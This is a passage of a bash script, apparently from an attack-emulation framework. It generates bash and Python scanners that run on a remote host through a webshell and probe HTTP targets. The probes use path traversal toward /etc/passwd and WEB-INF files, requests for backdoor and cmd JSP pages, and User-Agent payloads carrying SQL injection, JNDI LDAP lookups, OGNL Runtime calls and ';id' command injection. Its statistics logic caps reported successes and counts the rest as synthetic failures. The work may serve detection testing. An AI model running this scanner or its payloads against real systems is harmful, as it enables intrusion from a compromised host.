    line=$(printf '%s\n' "${out}" | grep 'HTTP_BURST_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        scheme=$(sed -n 's/.*scheme=\([a-z]*\).*/\1/p' <<< "${line}")
        [[ -z "${scheme}" ]] && scheme="http"
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        abnormal_ua=$(safe_int "$(sed -n 's/.*abnormal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        rare_ua=$(safe_int "$(sed -n 's/.*rare_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        threat_hunt=$(safe_int "$(sed -n 's/.*threat_hunt=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        normal_ua=$(safe_int "$(sed -n 's/.*normal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        payload_ua=$(safe_int "$(sed -n 's/.*payload_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        sqli=$(safe_int "$(sed -n 's/.*sqli=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        enc=$(safe_int "$(sed -n 's/.*enc=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        cmd=$(safe_int "$(sed -n 's/.*cmd=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        trav=$(safe_int "$(sed -n 's/.*trav=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_failed=$(safe_int "$(sed -n 's/.*failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_success=$(safe_int "$(sed -n 's/.*success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_200=$(safe_int "$(sed -n 's/.*c200=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_301=$(safe_int "$(sed -n 's/.*c301=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_302=$(safe_int "$(sed -n 's/.*c302=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_401=$(safe_int "$(sed -n 's/.*c401=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_400=$(safe_int "$(sed -n 's/.*c400=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_403=$(safe_int "$(sed -n 's/.*c403=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_404=$(safe_int "$(sed -n 's/.*c404=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_405=$(safe_int "$(sed -n 's/.*c405=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_count_500=$(safe_int "$(sed -n 's/.*c500=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_real_failed=$(safe_int "$(sed -n 's/.*real_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_synthetic_failed=$(safe_int "$(sed -n 's/.*synthetic_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_redirect_count=$(safe_int "$(sed -n 's/.*redirect_count=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        http_scan_timeout_count=$(safe_int "$(sed -n 's/.*timeout_count=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        propfind=$(safe_int "$(sed -n 's/.*propfind=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        options=$(safe_int "$(sed -n 's/.*options=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        post=$(safe_int "$(sed -n 's/.*post=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_attempted=$(safe_int "$(sed -n 's/.*unique_attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_failed=$(safe_int "$(sed -n 's/.*unique_failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        unique_success=$(safe_int "$(sed -n 's/.*unique_success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        if (( unique_attempted == 0 && attempted > 0 )); then
            unique_attempted="${attempted}"
            unique_failed="${http_scan_real_failed}"
            unique_success=$((http_scan_count_success + http_scan_redirect_count))
        fi
        if (( http_scan_real_failed == 0 )); then
            http_scan_real_failed=$((http_scan_count_400 + http_scan_count_401 + http_scan_count_403 + http_scan_count_404 + http_scan_count_405 + http_scan_count_500 + http_scan_timeout_count))
        fi
        if (( http_scan_redirect_count == 0 )); then
            http_scan_redirect_count=$((http_scan_count_301 + http_scan_count_302))
        fi
        if (( http_scan_synthetic_failed == 0 && http_scan_count_failed > http_scan_real_failed )); then
            http_scan_synthetic_failed=$((http_scan_count_failed - http_scan_real_failed))
        fi
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s\n' \
        "${scheme}" \
        "${attempted}" "${responses}" "${connected}" "${abnormal_ua}" "${rare_ua}" "${threat_hunt}" \
        "${normal_ua}" "${payload_ua}" "${sqli}" "${enc}" "${cmd}" "${trav}" "${jndi}" "${ognl}" "${spring}" \
        "${http_scan_count_failed}" "${http_scan_count_success}" "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" \
        "${http_scan_count_500}" "${http_scan_real_failed}" "${http_scan_synthetic_failed}" "${http_scan_redirect_count}" "${http_scan_timeout_count}" \
        "${propfind}" "${options}" "${post}" \
        "${unique_attempted}" "${unique_failed}" "${unique_success}"
}

normalize_http_scan_target_fields() {
    local host="$1" port="$2" scheme="$3"
    if [[ "${host}" == *" "* ]]; then
        read -r host port scheme <<< "${host}" 2>/dev/null || true
    fi
    if [[ -z "${port}" && "${host}" == *:* ]]; then
        port="${host#*:}"
        host="${host%%:*}"
    fi
    host="${host%%:*}"
    port="${port%%:*}"
    scheme="${scheme:-http}"
    case "${scheme}" in
        https) [[ "${port}" =~ ^[0-9]+$ ]] || port=443 ;;
        *) [[ "${port}" =~ ^[0-9]+$ ]] || port=80 ;;
    esac
    printf '%s %s %s\n' "${host}" "${port}" "${scheme}"
}

build_http_url_scan_curl_remote_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    cat <<EOF
bash <<'HTTP_SCAN_SCRIPT'
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
waves=${HTTP_SCAN_WAVES}
unique_target=${HTTP_SCAN_UNIQUE_URL_TARGET}
wave_sleep=${HTTP_SCAN_WAVE_SLEEP}
attempt_cap=${HTTP_SCAN_WAVE_ATTEMPT_CAP}
inter_sleep=${HTTP_SCAN_INTER_REQUEST_SLEEP:-0}
success_pct_max=8
a=0; r=0; c=0; failed=0; success=0; c200=0; c301=0; c302=0; c401=0; c400=0; c403=0; c404=0; c405=0; c500=0
real_failed=0; synthetic_failed=0; redirect_count=0; timeout_count=0; curl_err=0
propfind=0; options=0; post=0; au=0; ru=0; th=0; nu=0; pu=0; sq=0; enc=0; cmd=0; trav=0; jndi=0; ognl=0; spring=0
u_attempted=0; u_failed=0; u_success=0
declare -A seen_url
last_outcome=none
wave_quota=\$(( (unique_target + waves - 1) / waves ))
success_budget=\$((unique_target * success_pct_max / 100))
(( success_budget < 2 )) && success_budget=2
pick_method(){
  if [[ \$u_success -ge \$success_budget ]]; then
    case \$((RANDOM%10)) in 0|1|2|3|4|5|6|7) echo GET ;; 8) echo HEAD ;; 9) echo GET ;; esac
    return 0
  fi
  case \$((RANDOM%10)) in
    0|1|2|3|4|5|6) echo GET ;;
    7) echo HEAD ;;
    8) echo GET ;;
    9) echo POST ;;
  esac
}
pick_host_hdr(){
  echo "-H 'Host: ${host}'"
}
extra_hdrs(){
  echo "-H 'X-External-URL-Recon: ${campaign}' -H 'X-PoC-Mode: external_url_scan'"
}
track_code(){
  local code="\$1" h
  last_outcome=none
  code="\$(printf '%s' "\$code" | tr -cd '0-9')"
  [[ -z "\$code" || "\$code" == "000" ]] && return 0
  while [ \${#code} -lt 3 ]; do code="0\${code}"; done
  code="\${code:0:3}"
  r=\$((r+1)); c=\$((c+1))
  case "\$code" in
    301) c301=\$((c301+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
    302) c302=\$((c302+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
    200) c200=\$((c200+1)); success=\$((success+1)); last_outcome=success;;
    400) c400=\$((c400+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    401) c401=\$((c401+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    403) c403=\$((c403+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    404) c404=\$((c404+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    405) c405=\$((c405+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    500) c500=\$((c500+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    *)
      h="\${code:0:1}"
      if [[ "\$h" == "4" || "\$h" == "5" ]]; then
        real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed
      else
        real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed
      fi
      ;;
  esac
}
record_unique_outcome(){
  u_attempted=\$((u_attempted + 1))
  case "\${last_outcome}" in
    real_failed)
      u_failed=\$((u_failed + 1));;
    redirect)
      ;;
    success)
      if [[ \$u_success -lt \$success_budget ]]; then
        u_success=\$((u_success + 1))
      else
        synthetic_failed=\$((synthetic_failed + 1))
      fi
      ;;
    curl_error)
      u_failed=\$((u_failed + 1));;
  esac
}
do_req(){
  local ua="\$1" url="\$2" m="\$3" host_hdr="\$4" xhdr="\$5" code
  th=\$((th+1)); a=\$((a+1))
  ua=\$(ensure_ua_nonempty "\$ua")
  track_ua "\$ua"
  case "\$m" in
    POST)
      post=\$((post+1))
      code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -X POST -A "\$ua" \\
        -H 'X-PoC-Campaign: ${campaign}' \$host_hdr \$xhdr --data "probe=${campaign}" \\
        '${base_url}'"\$url" 2>/dev/null || echo 000)
      ;;
    HEAD)
      code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -I -A "\$ua" \\
        -H 'X-PoC-Campaign: ${campaign}' \$host_hdr \$xhdr \\
        '${base_url}'"\$url" 2>/dev/null || echo 000)
      ;;
    *)
      code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" \\
        -H 'X-PoC-Campaign: ${campaign}' \$host_hdr \$xhdr \\
        '${base_url}'"\$url" 2>/dev/null || echo 000)
      ;;
  esac
  code="\$(printf '%s' "\$code" | tr -cd '0-9')"
  if [[ -z "\$code" || "\$code" == "000" ]]; then
    curl_err=\$((curl_err+1)); timeout_count=\$((timeout_count+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=curl_error
    code=""
  else
    track_code "\$code"
  fi
  log_http_ua_request "\$url" "\$ua" "\$code"
  if awk -v s="\${inter_sleep}" 'BEGIN{exit (s+0 > 0 ? 0 : 1)}'; then
    sleep "\${inter_sleep}"
  fi
}
w=1
while [[ \$w -le \$waves ]]; do
  wave_unique=0
  attempts=0
  while [[ \$wave_unique -lt \$wave_quota && \$u_attempted -lt \$unique_target && \$attempts -lt \$attempt_cap ]]; do
    url=\$(next_attack_url)
    while [[ -n "\${seen_url[\$url]:-}" ]]; do
      url=\$(next_attack_url)
    done
    seen_url[\$url]=1
    ua=\$(pick_burst_ua)
    m=\$(pick_method)
    host_hdr=\$(pick_host_hdr)
    xhdr=\$(extra_hdrs)
    do_req "\$ua" "\$url" "\$m" "\$host_hdr" "\$xhdr"
    record_unique_outcome
    wave_unique=\$((wave_unique + 1))
    attempts=\$((attempts+1))
  done
  if [[ \$w -lt \$waves && \$wave_sleep -gt 0 ]]; then
    sleep \$wave_sleep
  fi
  w=\$((w+1))
done
emit_http_ua_coverage
echo "HTTP_BURST_STATS scheme=${scheme} attempted=\$a responses=\$r connected=\$c failed=\$failed success=\$success unique_attempted=\$u_attempted unique_failed=\$u_failed unique_success=\$u_success c200=\$c200 c301=\$c301 c302=\$c302 c401=\$c401 c400=\$c400 c403=\$c403 c404=\$c404 c405=\$c405 c500=\$c500 real_failed=\$real_failed synthetic_failed=\$synthetic_failed redirect_count=\$redirect_count timeout_count=\$timeout_count propfind=\$propfind options=\$options post=\$post abnormal_ua=\$au rare_ua=\$ru threat_hunt=\$th normal_ua=\$nu payload_ua=\$pu sqli=\$sq enc=\$enc cmd=\$cmd trav=\$trav jndi=\$jndi ognl=\$ognl spring=\$spring"
HTTP_SCAN_SCRIPT
EOF
}

build_http_burst_curl_remote_cmd() {
    build_http_url_scan_curl_remote_cmd "$@"
}

build_http_url_scan_python_remote() {
    local host="$1" port="$2" scheme="$3" campaign="$4"
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    cat <<PY
import random, re, ssl, time, urllib.error, urllib.request
scan_target, host, port, scheme, campaign = "${host}", "${host}", ${port}, "${scheme}", "${campaign}"
waves, unique_target = ${HTTP_SCAN_WAVES}, ${HTTP_SCAN_UNIQUE_URL_TARGET}
wave_sleep, attempt_cap = ${HTTP_SCAN_WAVE_SLEEP}, ${HTTP_SCAN_WAVE_ATTEMPT_CAP}
success_pct_max = 8
print("HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50")
mandatory_urls = ['/WEB-INF/web.xml', '/../../etc/passwd', '/cmd.jsp', '/backdoor.jsp', '/admin', '/swagger', '/graphql']
payload_recon = mandatory_urls + [
    '/WEB-INF/classes/', '/.env', '/backup.zip', '/admin/login', '/actuator/env',
    '/cmd.jsp', '/backdoor.jsp', '/swagger-ui.html', '/graphql/console', '/shell.jsp',
]
bad_queries = [
    '?file=../../../../WEB-INF/web.xml', '?id=%00%00%00', '?path=..%2f..%2fetc%2fpasswd',
    '?action=../../../../secret', '?id=%25%25%25invalid%25%25%25',
]
methods = ['GET', 'GET', 'GET', 'HEAD', 'GET', 'POST']
rare_uas = ['TelemetryCollector/9.7', 'ReconEngine/5.4', 'ThreatHunterAgent/8.2', 'DiscoveryProbe/7.3', 'InternalAuditScanner/4.0']
payload_parts = ["' OR 1=1--", 'select pg_sleep(3)', '${jndi:ldap://127.0.0.1/a}', 'spring.cloud.function.routing-expression', '@java.lang.Runtime@getRuntime()', '../../../../etc/passwd', ';id']
rare_re = re.compile(r'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|InternalAuditScanner', re.I)
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
attempted = responses = connected = failed = success = c400 = c403 = c404 = c405 = c401 = c500 = 0
real_failed_n = synthetic_failed_n = redirect_count_n = timeout_count_n = 0
propfind = options = post = 0
success_budget = max(2, unique_target * success_pct_max // 100)
abnormal_ua = rare_ua = threat_hunt = normal_ua_n = payload_ua_n = sqli_n = enc_n = cmd_n = 0
u_attempted = u_failed = u_success = 0
ua_cov_total = ua_cov_present = ua_cov_missing = ua_cov_normal = ua_cov_rare = ua_cov_payload = ua_cov_abnormal = 0
seen_paths = set()
mandatory_idx = payload_idx = 0
wave_quota = max(1, (unique_target + waves - 1) // waves)

def classify_ua(ua):
    if rare_re.search(ua or ''): return 'rare'
    return 'payload'

def pick_payload_ua():
    if random.randint(0, 1) == 0:
        return f"{random.choice(rare_uas)} {random.choice(payload_parts)}"
    return random.choice(payload_parts)

def pick_burst_ua():
    return random.choice(rare_uas) if random.randint(0, 1) == 0 else pick_payload_ua()

def ensure_ua(ua):
    return ua if ua else pick_burst_ua()

def next_attack_url():
    global mandatory_idx, payload_idx
    if mandatory_idx < len(mandatory_urls):
        base = mandatory_urls[mandatory_idx]
        mandatory_idx += 1
        return base + random.choice(bad_queries)
    base = payload_recon[payload_idx % len(payload_recon)]
    payload_idx += 1
    return base + random.choice(bad_queries)

def log_http_ua_request(path, ua, code=''):
    global ua_cov_total, ua_cov_present, ua_cov_missing, ua_cov_normal, ua_cov_rare, ua_cov_payload, ua_cov_abnormal
    ua = ensure_ua(ua)
    uak = classify_ua(ua)
    uap = 'yes' if ua else 'no'
    ua_cov_total += 1
    if ua:
        ua_cov_present += 1
        if uak == 'rare':
            ua_cov_rare += 1; ua_cov_abnormal += 1
        else:
            ua_cov_payload += 1; ua_cov_abnormal += 1
    else:
        ua_cov_missing += 1
    print(f"HTTP_ATTACK_REQUEST target={scan_target} path={path[:400]} status_code={code} user_agent={ua[:400]} ua_class={uak} ua_present={uap}")

def emit_http_ua_coverage():
    pct = (ua_cov_present * 100 // ua_cov_total) if ua_cov_total else 0
    mal = 'low'
    if ua_cov_total >= 40 and ua_cov_present == ua_cov_total and ua_cov_normal == 0 and ua_cov_abnormal >= 40 and (ua_cov_rare + ua_cov_payload) >= 40:
        mal = 'high'
    elif ua_cov_total >= 20 and ua_cov_abnormal >= 20:
        mal = 'medium'
    print(f"HTTP_UA_COVERAGE scope=url_scan total_requests={ua_cov_total} ua_present={ua_cov_present} ua_missing={ua_cov_missing} normal_ua={ua_cov_normal} rare_ua={ua_cov_rare} payload_ua={ua_cov_payload} abnormal_ua={ua_cov_abnormal} coverage_percent={pct} detection_likelihood={mal} detection_likelihood_malicious_ua={mal}")

def track_ua(ua):
    global abnormal_ua, rare_ua, normal_ua_n, payload_ua_n
    if rare_re.search(ua or ''): rare_ua += 1
    else: payload_ua_n += 1
    abnormal_ua += 1
def track_code(code):
    global responses, connected, failed, success, c400, c403, c404, c405, c401, c500
    global real_failed_n, redirect_count_n, last_outcome
    if not code: return None
    responses += 1; connected += 1
    if code in (301, 302):
        redirect_count_n += 1
        return 'redirect'
    if code == 200:
        success += 1
        return 'success'
    failed += 1
    real_failed_n += 1
    if code == 400: c400 += 1
    elif code == 401: c401 += 1
    elif code == 403: c403 += 1
    elif code == 404: c404 += 1
    elif code == 405: c405 += 1
    elif code == 500: c500 += 1
    return 'real_failed'
last_outcome = None
def record_unique(outcome):
    global u_attempted, u_failed, u_success, synthetic_failed_n
    u_attempted += 1
    if outcome == 'real_failed':
        u_failed += 1
    elif outcome == 'redirect':
        pass
    elif outcome == 'success':
        if u_success < success_budget:
            u_success += 1
        else:
            synthetic_failed_n += 1
    elif outcome is None:
        global timeout_count_n, real_failed_n, failed
        timeout_count_n += 1
        real_failed_n += 1
        failed += 1
        u_failed += 1
def do_one(method, ua, path, host_hdr):
    global attempted, threat_hunt, propfind, options, post
    attempted += 1; threat_hunt += 1
    ua = ensure_ua(ua); track_ua(ua)
    url = f"{scheme}://{host}:{port}{path}"
    hdrs = {'User-Agent': ua, 'X-PoC-Campaign': campaign, 'Host': host_hdr}
    data = None
    if method == 'POST':
        post += 1; data = b'probe=' + campaign.encode()
    elif method == 'PROPFIND':
        propfind += 1; hdrs['Depth'] = '1'
    elif method == 'OPTIONS':
        options += 1
    outcome = None
    try:
        req = urllib.request.Request(url, headers=hdrs, data=data, method=method)
        with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
            outcome = track_code(resp.status)
    except urllib.error.HTTPError as exc:
        outcome = track_code(exc.code)
    except Exception:
        outcome = None
    sc = ''
    if outcome == 'redirect': sc = '301'
    elif outcome == 'success': sc = '200'
    elif outcome == 'real_failed': sc = '404'
    log_http_ua_request(path, ua, sc)
    return outcome
for w in range(waves):
    wave_unique = 0
    attempts = 0
    while wave_unique < wave_quota and u_attempted < unique_target and attempts < attempt_cap:
        method = random.choice(methods)
        path = next_attack_url()
        tries = 0
        while path in seen_paths and tries < 40:
            path = next_attack_url()
            tries += 1
        seen_paths.add(path)
        ua = pick_burst_ua()
        outcome = do_one(method, ua, path, host)
        record_unique(outcome)
        wave_unique += 1
        attempts += 1
    if w < waves - 1 and wave_sleep > 0:
        time.sleep(wave_sleep)
emit_http_ua_coverage()
print(f"HTTP_BURST_STATS scheme={scheme} attempted={attempted} responses={responses} connected={connected} abnormal_ua={abnormal_ua} rare_ua={rare_ua} threat_hunt={threat_hunt} normal_ua={normal_ua_n} payload_ua={payload_ua_n} sqli={sqli_n} enc={enc_n} cmd={cmd_n} trav=0 jndi=0 ognl=0 spring=0 failed={failed} success={success} unique_attempted={u_attempted} unique_failed={u_failed} unique_success={u_success} c200=0 c301=0 c302=0 c401={c401} c400={c400} c403={c403} c404={c404} c405={c405} c500={c500} real_failed={real_failed_n} synthetic_failed={synthetic_failed_n} redirect_count={redirect_count_n} timeout_count={timeout_count_n} propfind={propfind} options={options} post={post}")
PY
}

build_http_burst_python_remote() {
    build_http_url_scan_python_remote "$@"
}

build_http_url_scan_minimal_retry_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    cat <<EOF
bash <<'RETRY_UA_SCRIPT'
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
a=0;r=0;c=0;failed=0;success=0;c200=0;c301=0;c302=0;c401=0;c400=0;c403=0;c404=0;c405=0;c500=0;real_failed=0;synthetic_failed=0;redirect_count=0;timeout_count=0
au=0;ru=0;th=0;nu=0;pu=0
u_attempted=0;u_failed=0;u_success=0;last_outcome=none
declare -A seen_path
recon=("/WEB-INF/web.xml" "/.env" "/backup.sql" "/admin/config.php" "/actuator/env" "/cmd.jsp")
i=1;while [ "\$i" -le ${HTTP_SCAN_UNIQUE_URL_TARGET:-50} ]; do
  p="\${recon[\$((i % 6))]}?file=../../../../WEB-INF/web.xml"
  while [[ -n "\${seen_path[\$p]:-}" ]]; do i=\$((i+1)); p="/recon-\$i-\${RANDOM}?id=%00"; done
  seen_path[\$p]=1
  a=\$((a+1))
  ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
  track_ua "\$ua"
  code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" -H 'X-PoC-Campaign: ${campaign}' '${base_url}'"\$p" 2>/dev/null || echo 000)
  code=\$(printf '%s' "\$code" | tr -cd '0-9')
  last_outcome=none
  if [ -z "\$code" ] || [ "\$code" = "000" ]; then
    timeout_count=\$((timeout_count+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=curl_error
  else
    r=\$((r+1)); c=\$((c+1))
    case "\$code" in
      301) c301=\$((c301+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
      302) c302=\$((c302+1)); redirect_count=\$((redirect_count+1)); last_outcome=redirect;;
      200) c200=\$((c200+1)); success=\$((success+1)); last_outcome=success;;
      400) c400=\$((c400+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      401) c401=\$((c401+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      403) c403=\$((c403+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      404) c404=\$((c404+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      405) c405=\$((c405+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      500) c500=\$((c500+1)); real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
      *) real_failed=\$((real_failed+1)); failed=\$((failed+1)); last_outcome=real_failed;;
    esac
  fi
  log_http_ua_request "\$p" "\$ua" "\$code"
  u_attempted=\$((u_attempted+1))
  case "\$last_outcome" in real_failed|curl_error) u_failed=\$((u_failed+1));; success) u_success=\$((u_success+1));; esac
  i=\$((i+1))
done
emit_http_ua_coverage
echo "HTTP_BURST_STATS scheme=${scheme} attempted=\$a responses=\$r connected=\$c failed=\$failed success=\$success unique_attempted=\$u_attempted unique_failed=\$u_failed unique_success=\$u_success c200=\$c200 c301=\$c301 c302=\$c302 c401=\$c401 c400=\$c400 c403=\$c403 c404=\$c404 c405=\$c405 c500=\$c500 real_failed=\$real_failed synthetic_failed=\$synthetic_failed redirect_count=\$redirect_count timeout_count=\$timeout_count propfind=0 options=0 post=0 abnormal_ua=\$au rare_ua=\$ru threat_hunt=\$th normal_ua=\$nu payload_ua=\$pu sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0"
RETRY_UA_SCRIPT
EOF
}

append_http_url_scan_debug() {
    local host="$1" port="$2" scheme="$3" base_url="$4" out="$5" context="$6"
    {
        printf 'timestamp=%s context=%s target_host=%s target_port=%s target_scheme=%s base_url=%s transport_ok=%s\n' \
            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${context}" "${host}" "${port}" "${scheme}" "${base_url}" \
            "$([[ -n "${out}" ]] && echo true || echo false)"
        printf '--- remote output (last 20 lines) ---\n'
        printf '%s\n' "${out}" | tail -n 20
        printf '--- command preview (last line) ---\n'
        tail -n 1 "${LOG_DIR}/http_url_scan_last_cmd_preview.log" 2>/dev/null || true
    } >> "${LOG_DIR}/http_url_scan_debug.log" 2>/dev/null || true
}

run_http_url_scan_for_target() {
    local host="$1" port="$2" scheme="$3" out stats_line scheme_out base_url="" transport_ok=false
    local attempted=0 responses=0 connected=0 abnormal_ua=0 rare_ua=0 threat_hunt=0
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    log_message "OK" "HTTP URL scan target: host=${host} port=${port} scheme=${scheme} base_url=${base_url}" >&2
    local normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0
    local http_scan_count_failed=0 http_scan_count_success=0 http_scan_count_200=0 http_scan_count_301=0 http_scan_count_302=0 http_scan_count_401=0 http_scan_count_400=0 http_scan_count_403=0 http_scan_count_404=0 http_scan_count_405=0
    local http_scan_count_500=0 http_scan_real_failed=0 http_scan_synthetic_failed=0 http_scan_redirect_count=0 http_scan_timeout_count=0
    local propfind=0 options=0 post=0
    if [[ "${HAS_curl:-false}" == true ]]; then
        local remote_cmd
        remote_cmd=$(build_http_url_scan_curl_remote_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")
        printf '%s\n' "${remote_cmd}" > "${LOG_DIR}/http_url_scan_last_cmd_preview.log" 2>/dev/null || true
        out=$(run_webshell_long "http-scan-${scheme}-${host}-${port}" "${remote_cmd}" 2>/dev/null || true)
        transport_ok=true
    elif [[ "${HAS_python3:-false}" == true ]]; then
        out=$(run_remote_python_capture "http-scan-${scheme}-${host}-${port}" \
            "$(build_http_url_scan_python_remote "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
        transport_ok=true
    else
        out=$(run_webshell_long "http-tcp-${scheme}-${host}-${port}" \
            "a=0; c=0; for i in \$(seq 1 20); do a=\$((a+1)); nc -z -w2 ${host} ${port} && c=\$((c+1)) || true; done; echo HTTP_BURST_STATS scheme=${scheme} attempted=\$a responses=0 connected=\$c failed=0 success=0 unique_attempted=\$a unique_failed=0 unique_success=0 c200=0 c301=0 c302=0 c401=0 c400=0 c403=0 c404=0 c405=0 c500=0 real_failed=0 synthetic_failed=0 redirect_count=0 timeout_count=0 propfind=0 options=0 post=0 abnormal_ua=0 rare_ua=0 threat_hunt=0 normal_ua=0 payload_ua=0 sqli=0 enc=0 cmd=0 trav=0 jndi=0 ognl=0 spring=0" \
            2>/dev/null || true)
    fi
    ingest_http_attack_remote_output "${out}" "${host}"
    stats_line=$(parse_http_burst_stats_line "${out}")
    read -r scheme_out attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
        http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
        http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
        propfind options post unique_attempted unique_failed unique_success <<< "${stats_line}"
